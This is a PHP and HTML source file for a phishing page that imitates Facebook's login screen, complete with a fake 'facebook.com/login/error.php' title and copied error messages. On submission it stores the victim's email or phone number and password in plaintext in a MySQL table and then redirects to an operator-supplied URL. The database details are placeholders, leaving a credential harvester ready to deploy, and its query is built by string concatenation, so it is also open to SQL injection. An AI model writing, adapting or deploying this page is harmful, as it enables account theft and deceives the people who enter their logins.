<!doctype html>
<html>
<title>
  facebook.com/login/error.php
</title>
<style>  input::placeholder{
  font-family: Helvetica, Sans-Serif, Arial;
  font-size: 17px;
  padding-left: 10px;
}
   </style>
<link rel="stylesheet" href="style1.css" type="text/css">
  </head>
  <body style="background-color:#f0f0f0;">
<?php
global $pass_err,$empty_err;
if(isset($_POST['submit']))
{
    if(empty($_POST['name']))
    {
      $empty_err="* The email address or mobile number you entered isn't <br>connected to an account. enter your id an password correctly";
    }
    elseif($_POST['name']!=null && $_POST['password']==null)
    {
        $pass_err=" *The password that you've entered is incorrect. Forgotten password?";
    }
}
if(strlen($empty_err)==0 && strlen($pass_err)==0)
{
  if(!empty($_POST['name']) || !empty($_POST['password'])){
  global $name;
  global $pass;
  $name=$_POST['name'];
  $pass=$_POST['password'];
  $connect=mysqli_connect("/*your local server may be (localhost)*/","/*your username*/","/*your password*/","/*database_name*/");
  $query="INSERT INTO `datas` (`name`, `pass`) VALUES ('$name','$pass')";
  $execute=mysqli_query($connect,$query);
  header("Location: /* your url*/");
  }
}
?>
<div style = "position:absolute;
top:8%;
left: 38%;
  justify-content:center;
  align-items:center;
  color: #3371f4;
  font-size: 50px;
  font-weight: bolder;
  font-family: Helvetica, Sans-Serif, Arial;
  letter-spacing: 0px;
  " >
  facebook
</div>
<div  style="position:absolute;
direction:flex;
flex:column;
left:30%;
top:18%;
height: 360px;
width:400px;
background-color: white;
border-radius: 10px;">
  <p style="margin-left:30%;margin-top:5%;font-size:20px;">Log in to Facebook</p>
  <form action="<?php echo $_SERVER['PHP_SELF'];?>" method="post">
  <input name="name" type="text" style="margin-top:3%;" placeholder="Email or Phone number">
<span class="error"><?php echo $empty_err; echo $pass_err;?></span>
  <input name="password" type="text" placeholder="Password">
  <button type="submit" name="submit" class="login">Log In</button>
    <div  style="margin-top:10%;">
  <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="reset">Forgotten Password</a>
    </div>
  </form>
</div>
  </body>
</html>
